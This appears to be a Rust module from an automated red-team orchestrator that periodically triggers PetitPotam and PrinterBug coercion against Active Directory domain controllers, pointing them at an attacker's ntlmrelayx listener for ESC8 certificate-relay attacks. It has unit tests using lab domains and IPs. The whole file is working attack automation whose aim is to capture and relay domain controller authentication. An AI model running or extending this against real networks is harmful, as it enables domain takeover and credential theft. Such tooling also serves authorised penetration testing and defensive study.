//! auto_coercion -- trigger ESC8 relay and DC coercion.

use std::sync::Arc;
use std::time::Duration;

use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Select the DCs that should be coerced this tick.
///
/// Filters `state.domain_controllers` for entries that:
/// - have not been processed yet (`DEDUP_COERCED_DCS`), and
/// - are not the listener machine itself (a self-coerce loops back to the
///   attacker host and produces nothing).
///
/// Returns `(domain, dc_ip)` pairs in the same order `domain_controllers`
/// iterates (HashMap order — caller can sort if determinism matters).
///
/// Extracted from `auto_coercion` so the listener self-exclusion and
/// dedup-respecting filter can be unit-tested without standing up a
/// Dispatcher.
pub(crate) fn select_coercion_work(state: &StateInner, listener_ip: &str) -> Vec<(String, String)> {
    state
        .domain_controllers
        .iter()
        .filter(|(_, dc_ip)| !state.is_processed(DEDUP_COERCED_DCS, dc_ip))
        .filter(|(_, dc_ip)| dc_ip.as_str() != listener_ip)
        .map(|(domain, dc_ip)| (domain.clone(), dc_ip.clone()))
        .collect()
}

/// Triggers coercion attacks when ADCS ESC8 servers or unconstrained delegation hosts exist.
/// Interval: 30s.
pub async fn auto_coercion(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Resolve listener IP: use the attacker's own IP from config.
        // This is where ntlmrelayx binds — it MUST NOT be a target host.
        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue, // no listener IP available, skip coercion
        };

        // Coerce DCs that haven't been coerced yet
        let work: Vec<(String, String)> = {
            let state = dispatcher.state.read().await;
            select_coercion_work(&state, &listener)
        };

        for (domain, dc_ip) in work {
            match dispatcher
                .request_coercion(&dc_ip, &listener, &["petitpotam", "printerbug"])
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, dc = %dc_ip, domain = %domain, "DC coercion dispatched");
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_COERCED_DCS, dc_ip.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_COERCED_DCS, &dc_ip)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch coercion"),
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn select_coercion_empty_state() {
        let s = StateInner::new("op".into());
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn select_coercion_emits_known_dc() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_coercion_work(&s, "192.168.58.1");
        assert_eq!(
            work,
            vec![("contoso.local".to_string(), "192.168.58.10".to_string())]
        );
    }

    #[test]
    fn select_coercion_excludes_listener_ip() {
        let mut s = StateInner::new("op".into());
        // Listener is the attacker host — self-coerce would loop back.
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.1".into());
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn select_coercion_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(DEDUP_COERCED_DCS, "192.168.58.10".into());
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn select_coercion_emits_multiple_dcs() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        let mut work = select_coercion_work(&s, "192.168.58.1");
        work.sort();
        assert_eq!(
            work,
            vec![
                ("contoso.local".to_string(), "192.168.58.10".to_string()),
                ("fabrikam.local".to_string(), "192.168.58.40".to_string()),
            ]
        );
    }

    #[test]
    fn select_coercion_mixed_processed_and_unprocessed() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        s.mark_processed(DEDUP_COERCED_DCS, "192.168.58.10".into());
        let work = select_coercion_work(&s, "192.168.58.1");
        assert_eq!(
            work,
            vec![("fabrikam.local".to_string(), "192.168.58.40".to_string())]
        );
    }
}
